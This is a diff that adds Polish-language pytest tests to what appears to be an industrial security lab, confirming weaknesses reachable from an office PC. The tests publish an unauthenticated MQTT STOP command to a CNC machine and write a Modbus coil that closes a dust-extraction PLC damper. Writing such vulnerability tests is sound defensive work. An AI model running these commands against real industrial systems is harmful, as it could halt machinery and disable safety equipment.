@@ -8,6 +8,7 @@ Uruchomienie: make v0-up-atak, potem make test-security.
 """
 
 import json
+import time
 
 import pytest
 
@@ -70,3 +71,37 @@ def test_podatnosc_modbus_plc_dostepny_z_biura(v0):
     wynik = v0.exec("biuro-pc", "python3", "-c", skrypt)
     assert wynik.returncode == 0, wynik.stderr
     assert len(json.loads(wynik.stdout)) == 3
+
+
+def komendy(v0, cnc: str, komenda: str) -> int:
+    """Ile razy obrabiarka zalogowała komendę MQTT (pole `komenda` ma tylko zdarzenie komenda_mqtt)."""
+    return v0.logi(cnc).count(f'"komenda": "{komenda}"')
+
+
+def test_podatnosc_wstrzykniecie_komendy_mqtt_z_biura(v0):
+    """Słabość 3: biuro bez hasła publikuje STOP w temacie komend obrabiarki, a obrabiarka go wykonuje (T08)."""
+    przed = komendy(v0, "cnc-2", "STOP")
+    wynik = v0.exec(
+        "biuro-pc", "mosquitto_pub", "-h", "mqtt.chmura.example", "-t", "wood-tech/hala1/cnc-2/komenda", "-m", "STOP"
+    )
+    assert wynik.returncode == 0, wynik.stderr
+    for _ in range(20):
+        if komendy(v0, "cnc-2", "STOP") > przed:
+            return
+        time.sleep(0.5)
+    pytest.fail("cnc-2 nie zalogowała komendy STOP z biura")
+
+
+def test_podatnosc_zapis_cewki_plc_z_biura(v0):
+    """Słabość 5: biuro bez uwierzytelnienia zamyka przepustnicę odpylania (cewka 1), potem ją otwiera (T08)."""
+    skrypt = (
+        "from pymodbus.client import ModbusTcpClient\n"
+        "c = ModbusTcpClient('plc-odpylanie', port=502, timeout=3)\n"
+        "assert c.connect()\n"
+        "assert not c.write_coil(1, False).isError()\n"
+        "print(c.read_coils(0, count=2).bits[1])\n"
+        "c.write_coil(1, True)\n"
+    )
+    wynik = v0.exec("biuro-pc", "python3", "-c", skrypt)
+    assert wynik.returncode == 0, wynik.stderr
+    assert wynik.stdout.strip() == "False"
